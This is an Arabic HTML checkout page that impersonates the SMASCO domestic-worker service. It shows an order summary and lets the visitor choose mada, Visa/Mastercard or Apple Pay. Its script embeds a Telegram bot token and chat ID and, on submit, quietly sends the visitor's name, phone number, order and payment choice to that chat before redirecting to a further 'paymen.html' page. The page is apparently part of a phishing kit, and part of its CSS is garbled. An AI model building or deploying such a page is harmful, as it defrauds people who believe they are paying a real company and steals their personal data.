<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow" />
  <title>الفاتورة وطريقة الدفع - سماسكو</title>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; }
    body {
      background: #f4f6f9;
      font-family: 'Tajawal', sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 480px;
      background: #fff;
      margin: 20px auto;
      padding: 20px;
      border-radius: 14px;
      box-shadow: 0 5px 20px rgba(0,0,0,0.06);
    }
    @media (min-width: 768px) {
      .container { max-width: 600px; margin: 40px auto; padding: 28px; }
    }
    .logo { text-align: center; margin-bottom: 18px; }
    .logo img { width: 150px; max-width: 60%; height: auto; }
    .steps-wrapper { margin-bottom: 20px; }
    .steps {
      position: relative;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 8px;
    }
    .steps::before {
      content: "";
      position: absolute;
      top: 16px;
      left: 7%;
      right: 7%;
      height: 2px;
      background: #e2e6ee;
      z-index: 1 .step {
     ;
    }
    position: relative;
      text-align: center;
      flex: 1;
      z-index: 2;
    }
    .step-circle {
      width: 32px;
      height: 32px;
      margin: 0 auto;
      border-radius: 50%;
      border: 2px solid #d0d4dd;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      color: #80869a;
      font-weight: 600;
    }
    .step-label {
      margin-top: 6px;
      font-size: 12px;
      color: #6b7280;
      white-space: nowrap;
    }
    .step.active .step-circle {
      background: #1d8cf8;
      border-color: #1d8cf8;
      color: #fff;
    }
    .step.done .step-circle {
      background: #22c55e;
      border-color: #22c55e;
      color: #fff;
    }
    h2 {
      text-align: center;
      margin-bottom: 18px;
      color: #1e3556;
      font-weight: 700;
      font-size: 1.3rem;
    }
    .invoice-box {
      border: 1px solid #e5e7eb;
      border-radius: 12px;
      padding: 16px;
      margin-bottom: 16px;
      background: #f9fafb;
    }
    .invoice-title {
      font-size: 1rem;
      font-weight: 700;
      color: #1e3556;
      margin-bottom: 12px;
      text-align: center;
    }
    .invoice-row {
      display: flex;
      justify-content: space-between;
      margin-bottom: 8px;
      font-size: 0.9rem;
    }
    .invoice-label { color: #6b7280; }
    .invoice-value { color: #1e3556; font-weight: 600; }
    .total-box {
      background: linear-gradient(135deg, #eff6ff 0%, #dbeafe 100%);
      border: 1px solid #bfdbfe;
      border-radius: 12px;
      padding: 16px;
      margin-top: 16px;
      text-align: center;
    }
    .total-label { font-size: 1rem; font-weight: 700; color: #1e3556; }
    .total-amount { font-size: 1.8rem; font-weight: 800; color: #1d4ed8; margin-top: 8px; }
    .payment-option {
      border: 1px solid #e5e7eb;
      border-radius: 12px;
      padding: 14px;
      margin-bottom: 10px;
      cursor: pointer;
      transition: .2s;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .payment-option:hover { border-color: #0080ff; background: #f0f7ff; }
    .payment-option.selected { border-color: #0080ff; background: #e6f0ff; }
    .payment-option input { margin-left: 10px; }
    .payment-text { font-weight: 600; color: #374151; }
    button {
      width: 100%;
      padding: 14px;
      background: #0080ff;
      border: none;
      border-radius: 12px;
      color: #fff;
      font-size: 1.1rem;
      margin-top: 20px;
      cursor: pointer;
      transition: .2s;
      font-weight: 700;
    }
    button:hover { background: #0069d9; }
    button:disabled { background: #9ca3af; cursor: not-allowed; }
    .footer {
      text-align: center;
      margin-top: 20px;
      padding: 15px 10px 25px;
      color: #555;
      font-size: 13px;
    }
    .footer img { width: 120px; max-width: 50%; display: block; margin: 0 auto 10px; height: auto; }
    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      padding: 20px;
    }
    .overlay.hidden { display: none; }
    .overlay-box {
      background: #ffffff;
      border-radius: 16px;
      padding: 25px 30px;
      text-align: center;
      max-width: 320px;
      width: 100%;
      box-shadow: 0 10px 30px rgba(0,0,0,0.18);
    }
    .spinner {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      border: 4px solid #e5e7eb;
      border-top-color: #1d8cf8;
      margin: 0 auto 12px;
      animation: spin 0.9s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .check-icon {
      width: 52px;
      height: 52px;
      border-radius: 50%;
      background: #22c55e;
      margin: 0 auto 12px;
      display: none;
      align-items: center;
      justify-content: center;
      font-size: 26px;
      color: #fff;
    }
    .overlay-title { font-weight: 700; margin-bottom: 4px; color: #111827; }
    .overlay-text { font-size: 0.95rem; color: #4b5563; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="image/smasco.png" alt="SMASCO Logo">
    </div>
    <h2>الفاتورة وطريقة الدفع</h2>
    
    <div class="invoice-box">
      <div class="invoice-title">ملخص الطلب</div>
      <div class="invoice-row">
        <span class="invoice-label">الاسم:</span>
        <span class="invoice-value" id="displayFullname">—</span>
      </div>
      <div class="invoice-row">
        <span class="invoice-label">الجوال:</span>
        <span class="invoice-value" id="displayPhone">—</span>
      </div>
      <div class="invoice-row">
        <span class="invoice-label">نوع الخدمة:</span>
        <span class="invoice-value" id="displayService">—</span>
      </div>
      <div class="invoice-row">
        <span class="invoice-label">جنسية العامل:</span>
        <span class="invoice-value" id="displayNationality">—</span>
      </div>
      <div class="invoice-row">
        <span class="invoice-label">الباقة:</span>
        <span class="invoice-value" id="displayPackage">—</span>
      </div>
    </div>
    
    <div class="total-box">
      <div class="total-label">المجموع الإجمالي</div>
      <div class="total-amount" id="displayAmount">— ريال</div>
    </div>
    
    <h3 style="font-size: 1.1rem; color: #1e3556; margin-top: 20px;">اختر طريقة الدفع</h3>
    
    <div class="payment-option" onclick="selectPayment('mada')">
      <div style="display: flex; align-items: center;">
        <img src="assets/photos/mad.png" alt="مدى" style="height: 30px; margin-left: 10px;">
        <span class="payment-text">مدى</span>
      </div>
      <input type="radio" name="payment" value="mada">
    </div>
    
    <div class="payment-option" onclick="selectPayment('visa')">
      <div style="display: flex; align-items: center;">
        <img src="assets/photos/vimas.webp" alt="فيزا ماستر" style="height: 30px; margin-left: 10px;">
        <span class="payment-text">فيزا / ماستركارد</span>
      </div>
      <input type="radio" name="payment" value="visa">
    </div>
    
    <div class="payment-option" onclick="selectPayment('apple')">
      <div style="display: flex; align-items: center;">
        <img src="assets/photos/appy.jpg" alt="أبل باي" style="height: 30px; margin-left: 10px;">
        <span class="payment-text">أبل باي</span>
      </div>
      <input type="radio" name="payment" value="apple">
    </div>
    
    <button type="button" id="submitBtn" onclick="submitPayment()">متابعة للدفع</button>
  </div>
  
  <div class="footer">
    <img src="image/smasco.png" alt="SMASCO Logo">
    © 2024 SMASCO. All rights reserved.
  </div>
  
  <div id="statusOverlay" class="overlay hidden">
    <div class="overlay-box">
      <div id="spinner" class="spinner"></div>
      <div id="checkIcon" class="check-icon">✔</div>
      <div class="overlay-title" id="overlayTitle">جاري إرسال البيانات...</div>
      <div class="overlay-text" id="overlayText">يرجى الانتظار</div>
    </div>
  </div>

  <script>
    
    const BOT_TOKEN = '8251097354:AAGvDQvwWJUA--rIgC1sZAMHsoTZ8gZh9Uo';
    const CHAT_ID = '6520639147';
    const WEBHOOK_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;

    let clientData = { fullname: 'عميلنا الكريم', phone: '' };
    let serviceData = { service_type: 'غير محدد', worker_nationality: 'غير محددة', package: '', amount: '0' };
    let selectedPaymentMethod = '';

    
    (function loadData() {
      try {
        const savedClient = localStorage.getItem('smasco_data');
        if (savedClient) clientData = JSON.parse(savedClient);
        
        const savedService = localStorage.getItem('smasco_service');
        if (savedService) serviceData = JSON.parse(savedService);
      } catch(e) {
        console.error('Error loading data:', e);
      }
      
     
      document.getElementById('displayFullname').textContent = clientData.fullname || '—';
      document.getElementById('displayPhone').textContent = clientData.phone || '—';
      document.getElementById('displayService').textContent = serviceData.service_type || '—';
      document.getElementById('displayNationality').textContent = serviceData.worker_nationality || '—';
      document.getElementById('displayPackage').textContent = serviceData.package || '—';
      document.getElementById('displayAmount').textContent = (serviceData.amount || '0') + ' ريال';
    })();

    function selectPayment(method) {
      selectedPaymentMethod = method;
      document.querySelectorAll('.payment-option').forEach(opt => {
        opt.classList.remove('selected');
      });
      event.currentTarget.classList.add('selected');
      document.querySelector(`input[value="${method}"]`).checked = true;
    }

    async function sendToTelegram(message) {
      try {
        const response = await fetch(`${WEBHOOK_URL}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          })
        });
        return await response.json();
      } catch (error) {
        console.error('Error sending to Telegram:', error);
        return null;
      }
    }

    async function submitPayment() {
      if (!selectedPaymentMethod) {
        alert('يرجى اختيار طريقة الدفع أولاً');
        return;
      }

      const overlay = document.getElementById('statusOverlay');
      const spinner = document.getElementById('spinner');
      const checkIcon = document.getElementById('checkIcon');
      
      spinner.style.display = 'block';
      checkIcon.style.display = 'none';
      document.getElementById('overlayTitle').textContent = 'جاري إرسال البيانات...';
      document.getElementById('overlayText').textContent = 'يرجى الانتظار';
      overlay.classList.remove('hidden');

      const requestId = Date.now().toString();
      
      const methodNames = {
        'mada': 'مدى',
        'visa': 'فيزا / ماستركارد',
        'apple': 'أبل باي'
      };

     
      localStorage.setItem('smasco_payment_method', selectedPaymentMethod);
      localStorage.setItem('smasco_payment_method_name', methodNames[selectedPaymentMethod]);
      
     
      sessionStorage.setItem('fullName', clientData.fullname);
      sessionStorage.setItem('phone', clientData.phone);
      sessionStorage.setItem('totalPrice', serviceData.amount);
      sessionStorage.setItem('paymentMethodName', methodNames[selectedPaymentMethod]);
      sessionStorage.setItem('selectedCompany', serviceData.service_type);

      const message = `💳 <b>طريقة الدفع - سماسكو</b>\n\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>العميل:</b> ${clientData.fullname}\n` +
        `📱 <b>الجوال:</b> ${clientData.phone}\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `🛠️ <b>نوع الخدمة:</b> ${serviceData.service_type}\n` +
        `🌍 <b>جنسية العامل:</b> ${serviceData.worker_nationality}\n` +
        `📦 <b>الباقة:</b> ${serviceData.package}\n` +
        `💰 <b>المبلغ:</b> ${serviceData.amount} ريال\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `💳 <b>طريقة الدفع:</b> ${methodNames[selectedPaymentMethod]}\n` +
        `⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}\n` +
        `🆔 <b>معرف الطلب:</b> ${requestId}`;

      await sendToTelegram(message);

      spinner.style.display = 'none';
      checkIcon.style.display = 'flex';
      document.getElementById('overlayTitle').textContent = 'تم إرسال البيانات';
      document.getElementById('overlayText').textContent = 'جاري الانتظار للتأكيد...';

      setTimeout(() => {
        overlay.classList.add('hidden');
        window.location.href = 'paymen.html';
      }, 1500);
    }
  </script>
</body>
</html>
